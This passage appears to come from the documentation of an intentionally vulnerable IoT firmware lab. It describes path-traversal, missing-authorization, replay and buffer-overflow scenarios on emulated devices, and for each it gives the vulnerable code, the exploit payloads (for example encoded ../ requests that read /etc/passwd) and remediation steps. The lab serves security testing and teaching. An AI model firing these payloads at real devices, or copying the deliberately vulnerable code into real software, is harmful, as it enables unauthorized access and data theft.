**Test — host:**

```bash
curl -s 'http://127.0.0.1:8080/missing/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd'
```

Expected: the contents of `/etc/passwd`, starting with `root:x:0:0:`.

### Scenario and ground truth

The module recipe is
[`cwe022-path-traversal_1.0.bb`](../meta-iotbench/recipes-vulns/cwe022-path-traversal/cwe022-path-traversal_1.0.bb),
installing
[`lighttpd-path-traversal.conf`](../meta-iotbench/recipes-vulns/cwe022-path-traversal/files/lighttpd-path-traversal.conf):

```text
server.error-handler-404 = "/.iotbench/path-dispatch.php"
```

and the dispatcher itself,
[`path-dispatch.php`](../meta-iotbench/recipes-vulns/cwe022-path-traversal/files/path-dispatch.php):

```php
$requestPath = (string)(parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?? '/');
$decodedPath = rawurldecode(rawurldecode($requestPath));
$reportPath  = '/var/lib/router-dashboard/reports/' . ltrim($decodedPath, '/');
$contents    = @file_get_contents($reportPath);
```

Lighttpd itself already URL-decodes the incoming request path once before
routing an unmatched URL to this 404 handler, so `REQUEST_URI` as PHP sees it
has already had one decode pass applied; the dispatcher then calls
`rawurldecode()` **twice more**, decoding `%25 2e%25 2e` (`%2e%2e`
double-encoded as `%252e%252e`) down to `..`. A path segment must therefore
be double-encoded to survive both the webserver's own decode and still
contain a literal `..` after the dispatcher's own first `rawurldecode()`
call, which is what the `%252e%252e` payload achieves. No canonicalization
(`realpath()` or an equivalent containment check) is ever applied to
`$reportPath` before it is read, so the resulting path can walk above
`/var/lib/router-dashboard/reports/` to read any file the web server's
user can access, such as `/etc/passwd`.

This is [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html).
The number of `../` segments needed depends on the depth of the requested
URL: the published payload uses a `/missing/` prefix (five segments deep
once joined under `reports/`) and correspondingly five `%252e%252e` groups;
fewer segments return `report not found` because the resulting path does not
reach the filesystem root.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe022-path-traversal`.

### Payload and expected result

| Request | Expected result |
| --- | --- |
| `GET /missing/anything-not-double-encoded` | `404`, body `report not found` |
| `GET /missing/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd` | `200`, body is `/etc/passwd` |
| Same payload with only four `%252e%252e` groups | `404`, `report not found` — one segment short of the filesystem root from this prefix depth |

| Result | Interpretation |
| --- | --- |
| `report not found` | Either the firmware is not `router-cwe022-path-traversal`, or the traversal depth does not match the request's prefix; adjust the number of `%252e%252e` groups to the path depth used |
| Response body starts with `root:x:0:0:` | Confirmed: the double-decoded 404 dispatcher reads arbitrary files |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`e817fa2b728d71c2b53b61cd592d4e1694459deb148dbbbc8aa9e4ee85fcf5d1`. The
first payload attempted during this session used only four `%252e%252e`
groups and returned `report not found`; five groups are required from the
`/missing/` prefix depth, and the corrected payload is what is published
above and in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md),
which also has the Git baseline commit.

### Remediation and verification

Decode the request path at most once, and after decoding, canonicalize it
(`realpath()`) and verify the result is still inside the intended `reports/`
directory before reading it; reject the request otherwise. Avoid routing a
404 handler through a script that reads arbitrary filesystem paths derived
from the request at all, if a fixed small set of report files is all that is
genuinely needed. After a fix, repeat the double-encoded payload above and
confirm the response is `404 report not found` rather than file contents.

## IP Camera Recording: Path Traversal

### Build, boot and manual testing

**What this tests.** An unauthenticated recording-export CGI on the IP
camera appends a user-supplied filename to a fixed recordings directory
without canonicalizing the result, so `../` sequences in the filename escape
that directory. This scenario is inspired by
[CVE-2016-15055](https://nvd.nist.gov/vuln/detail/CVE-2016-15055).

**Build and boot — host:**

```bash
FIRMWARE=ipcamera-cwe022-recording-path-traversal docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=ipcamera-cwe022-recording-path-traversal ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py ipcamera
```

Expected: the contents of `/etc/passwd` are printed.

### Scenario and ground truth

The module recipe is
[`cwe022-ipcamera-recording-traversal_1.0.bb`](../meta-iotbench/recipes-vulns/cwe022-ipcamera-recording-traversal/cwe022-ipcamera-recording-traversal_1.0.bb),
compiling
[`ipcamera-recording.c`](../meta-iotbench/recipes-vulns/cwe022-ipcamera-recording-traversal/files/ipcamera-recording.c)
into `recording.cgi` under `/www/pages/cgi-bin/`. It URL-decodes the `file`
query parameter once and builds the path with a single `snprintf`:

```c
snprintf(path, sizeof(path), "/var/lib/ipcamera/recordings/%s", requested);
FILE *input = fopen(path, "rb");
```

with no canonicalization or containment check on `requested` before it is
joined to the base directory. The
[exploit client](../scripts/exploit-device-cve-scenarios.py) sends
`file=../../../../etc/passwd`, which resolves above
`/var/lib/ipcamera/recordings/` to the filesystem root. This is
[CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html), a
single-decode variant of the same weakness class as
[Path Traversal: 404 Dispatcher](#path-traversal-404-dispatcher), simpler
because there is no error-handler indirection or double decoding involved
here: the CGI is reached directly by its own URL.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=ipcamera-cwe022-recording-path-traversal`.

### Payload and expected result

| Request | Expected result |
| --- | --- |
| `GET /cgi-bin/recording.cgi` (no `file`) | Returns the default `clip-001.txt` fixture |
| `GET /cgi-bin/recording.cgi?file=../../../../etc/passwd` | Returns the contents of `/etc/passwd` |
| `GET /cgi-bin/recording.cgi?file=does-not-exist.txt` | `404 Not Found`, `recording not found` |

| Result | Interpretation |
| --- | --- |
| `recording not found` for the traversal payload | Confirm you booted `ipcamera-cwe022-recording-path-traversal` |
| Output starts with `root:x:0:0:` | Confirmed: the recording export CGI reads arbitrary files |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`2d3f8c843c18ba94ccabafd9e9e4a07df7b8dda4a7a2411eb852641f55e255ef`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Canonicalize the resolved path (`realpath()`) and verify it is still inside
`/var/lib/ipcamera/recordings/` before opening it; reject the request
otherwise. Reject any `file` value containing `/` or `..` outright if
recordings are always flat filenames, which removes the traversal
possibility without needing path canonicalization at all. After a fix,
repeat the exploit script above and confirm it reports the file as not
found rather than printing `/etc/passwd`.

## Smart Plug: Missing Authorization

### Build, boot and manual testing

**What this tests.** The smart plug's MQTT relay controller validates the
device name and the requested state, but never checks whether the `actor`
who sent the request is actually authorized to control that plug. This
scenario is inspired by
[CVE-2023-1750](https://nvd.nist.gov/vuln/detail/CVE-2023-1750).

**Build and boot — host:**

```bash
FIRMWARE=smartplug-cwe862-missing-authorization docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=smartplug-cwe862-missing-authorization ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py smartplug
```

Expected output includes `actor=guest` and `authorization=skipped`.

### Scenario and ground truth

The module recipe is
[`cwe862-smartplug-missing-authorization_1.0.bb`](../meta-iotbench/recipes-vulns/cwe862-smartplug-missing-authorization/cwe862-smartplug-missing-authorization_1.0.bb),
installing the shell daemon
[`iotbench-smartplug-control`](../meta-iotbench/recipes-vulns/cwe862-smartplug-missing-authorization/files/iotbench-smartplug-control),
which subscribes to `iotbench/smartplug/control/set-relay` on the local
Mosquitto broker. It parses `device=...;actor=...;state=...` from each
message, rejects malformed device names or states, then:

```sh
# CWE-862: no owner/role check is performed for actor before relay control.
printf '%s\n' "$state" > /run/iotbench/smartplug-relay-state
mosquitto_pub -h 127.0.0.1 -t "$RESULT_TOPIC" \
    -m "relay=${state} actor=${actor:-anonymous} authorization=skipped"
```

`actor` is read and even echoed back in the result message, which makes the
missing check easy to see in the response, but it is never compared against
any owner list, role table or session state before the relay is actually
switched. This is
[CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html):
unlike [HTTP Login SQL Injection](#http-login-sql-injection), there is no
authentication bypass here — the request is accepted exactly as submitted;
the defect is that no authorization decision is ever made at all for an
action (controlling a physical relay) that should require one.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=smartplug-cwe862-missing-authorization`.

### Payload and expected result

| MQTT payload on `iotbench/smartplug/control/set-relay` | Expected result on `iotbench/smartplug/control-result` |
| --- | --- |
| `device=plug-lab-01;actor=guest;state=off` | `relay=off actor=guest authorization=skipped` |
| `device=plug-lab-01;state=on` (no `actor`) | `relay=on actor=anonymous authorization=skipped` |
| `device=wrong-device;actor=guest;state=on` | `rejected malformed request` |

| Result | Interpretation |
| --- | --- |
| `rejected malformed request` for a well-formed, correctly-named payload | Confirm you booted `smartplug-cwe862-missing-authorization` and the device/state fields match exactly |
| Result shows `authorization=skipped` for an arbitrary `actor` | Confirmed: the relay changes state without any ownership or role check |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`75816a1dbc5aa33b26756a2dcc5fe118bfc5b30450056c54931faeda1288eb2a`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Require the request to carry a verifiable identity (a session token or
signed credential, not a free-text `actor` field) and look that identity up
against the plug's actual owner or an access-control list before writing to
`/run/iotbench/smartplug-relay-state`; reject the request if the check fails
instead of always applying the requested state. After a fix, repeat the
exploit script above and confirm the result shows the request denied for an
unauthorized actor.

## Thermostat: Command Replay

### Build, boot and manual testing

**What this tests.** The thermostat's RF-to-MQTT bridge checks that a
control frame carries a specific `auth=valid-captured-frame` marker, but
never checks whether that exact frame — including its sequence number — has
already been accepted before, so the identical message can be resent and
accepted again. This scenario is inspired by
[CVE-2023-46892](https://nvd.nist.gov/vuln/detail/CVE-2023-46892) and
[CVE-2018-16242](https://nvd.nist.gov/vuln/detail/CVE-2018-16242).

**Build and boot — host:**

```bash
FIRMWARE=thermostat-cwe294-command-replay docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=thermostat-cwe294-command-replay ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py thermostat
```

Expected: the exploit client sends the identical frame twice and both are
accepted, reported as `count=1` and `count=2`.

### Scenario and ground truth

The module recipe is
[`cwe294-mqtt-replay_1.0.bb`](../meta-iotbench/recipes-vulns/cwe294-mqtt-replay/cwe294-mqtt-replay_1.0.bb),
installing the shared daemon
[`iotbench-mqtt-replay`](../meta-iotbench/recipes-vulns/cwe294-mqtt-replay/files/iotbench-mqtt-replay).
For the `thermostat` device class it subscribes to
`iotbench/thermostat/rf/command`, representing an RF-to-gateway bridge over
MQTT/TCP for this QEMU lab. Its acceptance logic is:

```sh
if [ "$authenticated" != yes ] || [ -z "$sequence" ] || [ -z "$value" ]; then
    mosquitto_pub ... -m "rejected invalid frame"; continue
fi
# CWE-294: sequence is logged but never checked against previously seen frames.
count=$((count + 1))
printf '%s\n' "$count" > "$COUNT_FILE"
printf '%s\n' "$value" > "$STATE_FILE"
mosquitto_pub ... -m "accepted seq=${sequence} ${VALUE_KEY}=${value} count=${count}"
```

The `seq=1042` field is parsed out of the frame and even echoed back in the
acceptance message, but it is only ever appended to a running counter — it
is never stored per-sequence-number and compared against frames already
seen, so resending the exact same `seq=1042;setpoint=29.0;auth=valid-captured-frame`
frame is accepted a second time with the counter simply incrementing from 1
to 2. This is
[CWE-294: Authentication Bypass by Capture-replay](https://cwe.mitre.org/data/definitions/294.html):
the `auth=valid-captured-frame` marker genuinely represents "this frame was
correctly authenticated once", but with no freshness or replay check, a
captured frame remains valid forever, modeling the real-world weakness of
RF/BLE gateways that authenticate a command's origin but not its freshness.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=thermostat-cwe294-command-replay`.

### Payload and expected result

| MQTT payload on `iotbench/thermostat/rf/command` (sent twice, identical) | Expected result on `iotbench/thermostat/rf/result`, both times |
| --- | --- |
| `seq=1042;setpoint=29.0;auth=valid-captured-frame` | `accepted seq=1042 setpoint=29.0 count=1`, then `accepted seq=1042 setpoint=29.0 count=2` |
| Same frame without `auth=valid-captured-frame` | `rejected invalid frame` |

| Result | Interpretation |
| --- | --- |
| Second send is rejected or the counter does not advance | Confirm you booted `thermostat-cwe294-command-replay` |
| Both sends return `accepted ...`, counter incrementing | Confirmed: the identical authenticated frame is accepted repeatedly |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`e49eed14cd40baaa8d4249e8ed6a08ba5b2acc9480fee173feec1e47c4d89e86`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Track the highest sequence number accepted per device and reject any frame
whose sequence is not strictly greater (or maintain a short window of
recently-seen sequence numbers, for protocols where reordering is expected),
in addition to the existing authentication marker. A monotonically enforced
sequence, or a timestamp/nonce bound to the authenticated payload, is what
turns "this frame was once valid" into "this frame is fresh". After a fix,
repeat the exploit script above and confirm only the first send is accepted.

## Smart Bulb: ZCL Heap Overflow

### Build, boot and manual testing

**What this tests.** A Zigbee ZCL commissioning bridge trusts a
protocol-declared length field up to 36 bytes while its heap destination
field is only 32 bytes, so a 33–36 byte attribute value overwrites an
adjacent 4-byte integrity field on the same heap allocation. This scenario is
inspired by
[CVE-2020-6007](https://nvd.nist.gov/vuln/detail/CVE-2020-6007); the radio
transport is represented over TCP for this QEMU lab.

**Build and boot — host:**

```bash
FIRMWARE=smartbulb-cwe122-zcl-heap-overflow docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=smartbulb-cwe122-zcl-heap-overflow ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py smartbulb
```

Expected output: `HEAP_OVERFLOW zcl-integrity-corrupted`.

### Scenario and ground truth

The module recipe is
[`cwe122-smartbulb-zcl-overflow_1.0.bb`](../meta-iotbench/recipes-vulns/cwe122-smartbulb-zcl-overflow/cwe122-smartbulb-zcl-overflow_1.0.bb),
compiling
[`iotbench-zcld.c`](../meta-iotbench/recipes-vulns/cwe122-smartbulb-zcl-overflow/files/iotbench-zcld.c),
a TCP service on port `17754`:

```c
struct zcl_attribute {
    unsigned char value[32];
    unsigned char integrity[4];
};
...
size_t length = (size_t)(((unsigned)header[0] << 8) | header[1]);
if (length == 0 || length > sizeof(input) /* 36 */ || receive_exact(...) < 0) { ... }

struct zcl_attribute *attribute = malloc(sizeof(*attribute));
memcpy(attribute->integrity, "SAFE", 4);
/* CWE-122: protocol length permits 36 bytes, heap field holds only 32. */
memcpy(attribute->value, input, length);

if (memcmp(attribute->integrity, "SAFE", 4) != 0)
    send(client, "HEAP_OVERFLOW zcl-integrity-corrupted\n", 38, 0);
```

The frame's own length header is checked only against `sizeof(input)` (36
bytes), not against `value`'s actual 32-byte capacity, so a 33–36 byte
attribute overflows into the adjacent `integrity` field within the same
36-byte heap allocation. The [exploit client](../scripts/exploit-device-cve-scenarios.py)
sends a 36-byte attribute (`struct.pack(">H", 36) + b"A" * 36`), corrupting
`integrity` away from `"SAFE"` and producing the `HEAP_OVERFLOW` response.
This is [CWE-122: Heap-based Buffer Overflow](https://cwe.mitre.org/data/definitions/122.html).

Because `attribute` is heap-allocated (`malloc`, not a local array), the
compiler cannot determine its field size at compile time the way it can for
a stack-local struct, so this `memcpy` is **not** rewritten by the Yocto
toolchain's default `_FORTIFY_SOURCE` hardening into a checked call that
would abort on overflow; see
[Smart Hub: Database Stack Overflow](#smart-hub-database-stack-overflow) for
a scenario where the equivalent overflow **is** on a stack-local object and
does need an explicit opt-out of that hardening to produce its intended
signal instead of a crash.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=smartbulb-cwe122-zcl-heap-overflow`.

### Payload and expected result

| Frame sent to `:17754` | Expected response |
| --- | --- |
| 2-byte length header `31` + 31 bytes of data | `COMMISSIONED` (fits `value[32]` with no overflow) |
| 2-byte length header `36` + 36 bytes of data | `HEAP_OVERFLOW zcl-integrity-corrupted` |
| Length header `0` or `>36` | `INVALID_FRAME` |

| Result | Interpretation |
| --- | --- |
| `COMMISSIONED` for a 36-byte attribute | Confirm you booted `smartbulb-cwe122-zcl-heap-overflow` |
| `HEAP_OVERFLOW zcl-integrity-corrupted` | Confirmed: the oversized attribute overwrote the adjacent heap field |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`c5384e7b792c52491db667d7aaf117912a1902c742fce7beed63ecfca10b4fb5`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Validate the protocol length against the destination field's actual
capacity (32 bytes), not the receive buffer's capacity (36 bytes), before
copying: `if (length > sizeof(attribute->value)) { reject }`. More
generally, size every destination check against the field being written,
not a larger buffer the value merely passed through earlier in the function.
After a fix, repeat the 36-byte payload above and confirm the response is a
rejection (or `COMMISSIONED` with the integrity field intact) rather than
`HEAP_OVERFLOW`.

## Smart Hub: Database Stack Overflow

### Build, boot and manual testing

**What this tests.** The smart hub's database-lookup CGI copies an
attacker-controlled `bucket` name into a fixed 64-byte stack buffer with
`strcpy`, with no length check, letting a 68-byte value overwrite an
adjacent 4-byte authorization field on the same stack frame. This scenario
is inspired by
[CVE-2018-3915](https://nvd.nist.gov/vuln/detail/CVE-2018-3915).

**Build and boot — host:**

```bash
FIRMWARE=smarthub-cwe121-database-stack-overflow docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=smarthub-cwe121-database-stack-overflow ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py smarthub
```

Expected output: `STACK_OVERFLOW authorization=admin`.

### Scenario and ground truth

The module recipe is
[`cwe121-smarthub-stack-overflow_1.0.bb`](../meta-iotbench/recipes-vulns/cwe121-smarthub-stack-overflow/cwe121-smarthub-stack-overflow_1.0.bb),
compiling
[`smarthub-database.c`](../meta-iotbench/recipes-vulns/cwe121-smarthub-stack-overflow/files/smarthub-database.c)
into `hub-db.cgi`:

```c
struct request_frame {
    char bucket[64];
    volatile uint32_t authorization;
    char guard[32];
};
...
/* CWE-121: attacker input is copied into a fixed stack buffer. */
strcpy(frame.bucket, decoded);

if (memcmp((const void *)&frame.authorization, "ROOT", 4) == 0)
    printf("STACK_OVERFLOW authorization=admin\n");
```

`decoded` comes straight from the `bucket` query parameter, URL-decoded with
no length restriction beyond a 160-byte scratch buffer, and is copied into
the 64-byte `bucket` field with `strcpy`, which has no destination-size
parameter at all. A `bucket` value of 64 `A` characters followed by `ROOT`
(68 bytes total, plus `strcpy`'s own NUL terminator) overflows past `bucket`
into the adjacent `authorization` field, landing the literal bytes `ROOT`
there; the subsequent `memcmp` against `"ROOT"` then succeeds and the CGI
reports `authorization=admin`. This is
[CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html).

**This scenario required a fix during this session's validation**, and is
the one place in this document where the published payload exercises a
defect that was found and corrected here rather than one that worked as
documented on the first try. With the module compiled using Yocto's default
`${CFLAGS}` (which set `_FORTIFY_SOURCE=2`), the compiler replaces `strcpy`
into a stack-local, compile-time-sized destination with `__strcpy_chk`,
which aborts the process at runtime once the source is longer than the
destination — so the 68-byte payload made the CGI terminate with `SIGABRT`
before any output was produced, and the web server returned `HTTP 500`
instead of the intended `STACK_OVERFLOW` line. The recipe's `do_compile()`
now explicitly disables that hardening for this one intentionally-vulnerable
binary:

```text
${CC} ${CFLAGS} ${LDFLAGS} -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 \
  ${S}/smarthub-database.c -o ${B}/hub-db.cgi
```

and the `request_frame` struct gained a trailing `guard[32]` field so that
the payload's own copy terminator lands inside the struct rather than on the
stack frame's saved registers. See
[Smart Bulb: ZCL Heap Overflow](#smart-bulb-zcl-heap-overflow) and
[PLC: Modbus Stack Overflow](#plc-modbus-stack-overflow) for two
structurally similar overflows in this document that did **not** need this
same opt-out, and the brief explanation of why in the latter's
"Scenario and ground truth" section.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=smarthub-cwe121-database-stack-overflow`. The exported
image already includes the `_FORTIFY_SOURCE=0` fix described above; no
further action is needed to reproduce the published result.

### Payload and expected result

| `bucket` query value | Expected response |
| --- | --- |
| `devices` (benign) | `bucket=devices authorization=user` |
| 64 `A` characters followed by `ROOT` (68 bytes) | `STACK_OVERFLOW authorization=admin` |

| Result | Interpretation |
| --- | --- |
| `HTTP 500 Internal Server Error` for the overflow payload | The exported image predates the `_FORTIFY_SOURCE=0` fix; rebuild `smarthub-cwe121-database-stack-overflow` from the current sources |
| `STACK_OVERFLOW authorization=admin` | Confirmed: the oversized bucket name overwrote the adjacent authorization field |

### Completed validation

Boot-tested manually and self-verified end to end (both the failing and the
corrected build) on 30 October 2026. Final exported rootfs SHA-256
(post-fix): `8bf938dd0e00b19c080dfb1f63c000f77c4a2580bbc460797b6703edff28ee08`.
Full details, including the pre-fix failure and the exact diagnosis, are in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Check the input length against `sizeof(frame.bucket)` before copying (or use
`strncpy`/`snprintf` with an explicit bound) instead of `strcpy`, regardless
of whether compiler-level fortification is enabled; the underlying
out-of-bounds write is a real memory-safety bug independent of whether it
happens to be caught at runtime. After a fix, repeat the 68-byte payload
above and confirm the response is `bucket=<truncated value> authorization=user`
rather than `STACK_OVERFLOW authorization=admin`.

## Environmental Sensor: Unauthenticated Calibration

### Build, boot and manual testing

**What this tests.** The environmental sensor's calibration topic validates
the sensor name and the numeric offset, but accepts the request from any
MQTT publisher with no authentication at all. This scenario is inspired by
[CVE-2023-23545](https://nvd.nist.gov/vuln/detail/CVE-2023-23545).

**Build and boot — host:**

```bash
FIRMWARE=envsensor-cwe306-unauthenticated-calibration docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=envsensor-cwe306-unauthenticated-calibration ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py envsensor
```

Expected output includes `authenticated=no`.

### Scenario and ground truth

The module recipe is
[`cwe306-envsensor-unauth-calibration_1.0.bb`](../meta-iotbench/recipes-vulns/cwe306-envsensor-unauth-calibration/cwe306-envsensor-unauth-calibration_1.0.bb),
installing
[`iotbench-envsensor-calibration`](../meta-iotbench/recipes-vulns/cwe306-envsensor-unauth-calibration/files/iotbench-envsensor-calibration),
which subscribes to `iotbench/envsensor/calibration/set`. It checks that
`sensor` is one of `co2`, `temperature` or `humidity`, and that `offset`
looks numeric, then:

```sh
# CWE-306: no authentication is required before changing calibration.
mkdir -p /run/iotbench/calibration
printf '%s\n' "$offset" > "/run/iotbench/calibration/${sensor}"
mosquitto_pub ... -m "calibration-updated sensor=${sensor} offset=${offset} authenticated=no"
```

There is no credential, token or any other proof of identity checked
anywhere in this path; the response even states `authenticated=no`
explicitly, which the module's own output makes visible. This is
[CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html):
unlike [Smart Plug: Missing Authorization](#smart-plug-missing-authorization),
where a caller identity is present but not checked against an access
policy, here no caller identity is required or examined at all before a
safety-relevant function (sensor calibration) is changed.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=envsensor-cwe306-unauthenticated-calibration`.

### Payload and expected result

| MQTT payload on `iotbench/envsensor/calibration/set` | Expected result on `iotbench/envsensor/calibration/result` |
| --- | --- |
| `sensor=co2;offset=900` | `calibration-updated sensor=co2 offset=900 authenticated=no` |
| `sensor=pressure;offset=10` (unsupported sensor) | `rejected malformed calibration` |
| `sensor=co2;offset=abc` (non-numeric) | `rejected malformed calibration` |

| Result | Interpretation |
| --- | --- |
| `rejected malformed calibration` for `sensor=co2;offset=900` | Confirm you booted `envsensor-cwe306-unauthenticated-calibration` |
| Result shows `authenticated=no` | Confirmed: calibration changes with no credential of any kind |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`7f49ad02c6eb84fc6d48b51e1e67a6969a53f85689237a25af676752c1a8fccb`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Require an authenticated, authorized identity (MQTT client certificates or a
broker ACL tied to per-device credentials, not the shared anonymous local
broker this lab uses) before accepting any calibration change, and consider
bounding how far a single calibration request can move the offset even for
an authenticated caller. After a fix, repeat the exploit script above and
confirm the request is rejected without a valid credential.

## Smart Speaker: ID3 Heap Overflow

### Build, boot and manual testing

**What this tests.** A media-indexing service trusts an ID3 tag's own
declared title length up to 64 bytes while its heap destination field is
only 64 bytes but sits inside a struct with a 4-byte field immediately after
it — so a 64-byte title (the protocol's own maximum) exactly fills the field
with no slack, and the surrounding frame layout was built so that this
maximum-length write is the one that corrupts the adjacent field. This
scenario is inspired by
[CVE-2025-1049](https://nvd.nist.gov/vuln/detail/CVE-2025-1049).

**Build and boot — host:**

```bash
FIRMWARE=smartspeaker-cwe122-id3-heap-overflow docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=smartspeaker-cwe122-id3-heap-overflow ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py smartspeaker
```

Expected output: `HEAP_OVERFLOW decoder-state-corrupted`.

### Scenario and ground truth

The module recipe is
[`cwe122-smartspeaker-id3-overflow_1.0.bb`](../meta-iotbench/recipes-vulns/cwe122-smartspeaker-id3-overflow/cwe122-smartspeaker-id3-overflow_1.0.bb),
compiling
[`iotbench-id3d.c`](../meta-iotbench/recipes-vulns/cwe122-smartspeaker-id3-overflow/files/iotbench-id3d.c),
a TCP service on port `18000`:

```c
struct media_metadata {
    unsigned char title[64];
    unsigned char decoder_state[4];
};
...
unsigned char title[68];
size_t length = header[3];
if (length == 0 || length > sizeof(title) /* 68 */ || receive_exact(...) < 0) { ... }

struct media_metadata *metadata = malloc(sizeof(*metadata));
memcpy(metadata->decoder_state, "SAFE", 4);
/* CWE-122: the ID3 length is trusted for a smaller heap title field. */
memcpy(metadata->title, title, length);
```

The frame's own one-byte length field (`header[3]`) is checked only against
the 68-byte receive scratch buffer, not against `title`'s actual 64-byte
field in `media_metadata`, so a 65–68 byte declared title overflows into the
adjacent `decoder_state` bytes within the same heap allocation, exactly the
same shape as
[Smart Bulb: ZCL Heap Overflow](#smart-bulb-zcl-heap-overflow). The
[exploit client](../scripts/exploit-device-cve-scenarios.py) sends a 68-byte
title (`bytes([68]) + b"B" * 68`), corrupting `decoder_state` away from
`"SAFE"` and producing the `HEAP_OVERFLOW` response. This is
[CWE-122: Heap-based Buffer Overflow](https://cwe.mitre.org/data/definitions/122.html).
As with the smart bulb scenario, `metadata` is heap-allocated, so this
`memcpy` is not one the Yocto toolchain's default fortification flags turn
into a checked, aborting call; no build-flag override was needed for this
scenario to produce its intended signal.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=smartspeaker-cwe122-id3-heap-overflow`.

### Payload and expected result

| Frame sent to `:18000` (`ID3` + 1-byte length + title bytes) | Expected response |
| --- | --- |
| Length `63`, 63 bytes of title data | `TRACK_INDEXED` (fits `title[64]` with one byte of slack) |
| Length `68`, 68 bytes of title data | `HEAP_OVERFLOW decoder-state-corrupted` |
| Header not starting with `ID3`, or length `0`/`>68` | `INVALID_ID3` |

| Result | Interpretation |
| --- | --- |
| `TRACK_INDEXED` for a 68-byte title | Confirm you booted `smartspeaker-cwe122-id3-heap-overflow` |
| `HEAP_OVERFLOW decoder-state-corrupted` | Confirmed: the oversized title overwrote the adjacent heap field |

### Completed validation

Self-verified end to end on 30 October 2026 (image rebuilt from source in
this session, `0 ERROR` in the BitBake log; the boot and the exploit client
run were both executed directly during this session). Exported rootfs SHA-256:
`27e8e3499870fcb9c0f6d36c22da7e9a8e13d8d89c9a921e4671426dacc2f141`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Validate the declared title length against `sizeof(metadata->title)` (64
bytes), not against the receive scratch buffer's capacity (68 bytes), before
copying. After a fix, repeat the 68-byte payload above and confirm the
response is a rejection or truncation rather than `HEAP_OVERFLOW`.

## Health Monitor: Memory Disclosure

### Build, boot and manual testing

**What this tests.** A patient-monitor TCP service lets any caller read an
arbitrary offset and length out of a fixed in-process memory buffer, with no
authentication, disclosing synthetic patient data and device secrets that
were never meant to be exposed over the network at all. This scenario is
inspired by
[CVE-2018-10599](https://nvd.nist.gov/vuln/detail/CVE-2018-10599).

**Build and boot — host:**

```bash
FIRMWARE=healthmonitor-cwe200-memory-disclosure docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=healthmonitor-cwe200-memory-disclosure ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
